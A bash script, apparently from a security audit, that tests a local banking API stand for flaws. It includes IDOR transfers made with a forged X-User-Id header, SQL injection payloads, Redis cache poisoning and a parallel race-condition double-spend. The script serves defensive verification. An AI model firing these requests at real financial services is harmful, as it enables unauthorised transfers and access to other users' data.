#!/usr/bin/env bash
# Динамическая проверка гипотез на ЛОКАЛЬНОМ стенде (127.0.0.1). Запуск: bash checks.sh
API=${API:-http://127.0.0.1:18000}
PSQL="psql -h 127.0.0.1 -p 55432 -U postgres bank -At"
RC="redis-cli -p 56379"
say(){ printf '\n### %s\n' "$*"; }
req(){ echo "\$ curl $*"; curl -s -w '  -> HTTP %{http_code}, %{time_total}s\n' "$@"; }

say "0. Исходное состояние"
$PSQL -c "select id, owner_user_id, balance_cents from accounts order by id"

say "1. Аутентификации нет: без заголовка 401, с любым X-User-Id — доступ"
req "$API/transactions"
req -H 'X-User-Id: 2' "$API/transactions"

say "2. IDOR: клиент (реально user 2) подставляет X-User-Id: 1 и списывает со счёта 1"
req -X POST -H 'X-User-Id: 1' -H 'Content-Type: application/json' \
    -d '{"from_account_id":1,"to_account_id":2,"amount_cents":1000}' "$API/transfer"
say "2b. IDOR: чтение истории чужого пользователя"
req -H 'X-User-Id: 1' "$API/transactions"

say "3. Контроль владения работает только при честном X-User-Id (ожидаем 403)"
req -X POST -H 'X-User-Id: 2' -H 'Content-Type: application/json' \
    -d '{"from_account_id":1,"to_account_id":2,"amount_cents":1}' "$API/transfer"

say "4. SQLi в search: payload'ы передаются как bind-параметр (ожидаем пустой список, не ошибку)"
req -G -H 'X-User-Id: 1' --data-urlencode "search=' OR '1'='1" "$API/transactions"
req -G -H 'X-User-Id: 1' --data-urlencode "search=1'; SELECT pg_sleep(3)--" "$API/transactions" -o /dev/null
say "4b. Wildcard в ILIKE: '%' и '_' не экранируются (совпадает со всем)"
req -G -H 'X-User-Id: 1' --data-urlencode "search=_" "$API/transactions"

say "5. Перечисление счетов: разные ответы для существующего/несуществующего to_account"
req -X POST -H 'X-User-Id: 2' -H 'Content-Type: application/json' \
    -d '{"from_account_id":2,"to_account_id":999,"amount_cents":1}' "$API/transfer"
req -X POST -H 'X-User-Id: 2' -H 'Content-Type: application/json' \
    -d '{"from_account_id":2,"to_account_id":1,"amount_cents":999999999}' "$API/transfer"

say "6. Нет верхней границы amount_cents: значение > BIGINT"
req -X POST -H 'X-User-Id: 2' -H 'Content-Type: application/json' \
    -d '{"from_account_id":2,"to_account_id":1,"amount_cents":99999999999999999999}' "$API/transfer"

say "7. Кэш Redis: ключ, записанный в Redis, обнуляет выдачу истории (Redis без аутентификации)"
$RC SET 'tx:1:20:' x >/dev/null; echo "\$ redis-cli SET tx:1:20: x"
req -H 'X-User-Id: 1' "$API/transactions"
$RC DEL 'tx:1:20:' >/dev/null
say "7b. После перевода удаляется ключ tx:{uid}, а читаются tx:{uid}:{limit}:{search} — инвалидация не совпадает"
$RC SET 'tx:2:20:' x >/dev/null
req -X POST -H 'X-User-Id: 2' -H 'Content-Type: application/json' \
    -d '{"from_account_id":2,"to_account_id":1,"amount_cents":1}' "$API/transfer"
echo "\$ redis-cli EXISTS tx:2:20:  -> $($RC EXISTS 'tx:2:20:') (1 = ключ пережил инвалидацию)"
$RC DEL 'tx:2:20:' >/dev/null

say "8. Race condition (TOCTOU): 20 параллельных переводов всего баланса со счёта 3"
$PSQL -c "insert into accounts(id, owner_user_id, balance_cents) values (3, 3, 10000) on conflict (id) do update set balance_cents=10000" >/dev/null
for i in $(seq 1 20); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST -H 'X-User-Id: 3' -H 'Content-Type: application/json' \
    -d '{"from_account_id":3,"to_account_id":2,"amount_cents":10000}' "$API/transfer" &
done; wait; echo
$PSQL -c "select 'account 3 balance_cents=' || balance_cents from accounts where id=3"
$PSQL -c "select 'successful transfers from 3: ' || count(*) from transactions where from_account_id=3"

say "9. Повтор (replay) запроса = повторное списание: нет idempotency key"
$PSQL -c "select count(*) || ' transactions total' from transactions"

say "10. Swagger/OpenAPI доступны без аутентификации"
curl -s -o /dev/null -w '/docs -> HTTP %{http_code}\n' "$API/docs"
curl -s -o /dev/null -w '/openapi.json -> HTTP %{http_code}\n' "$API/openapi.json"
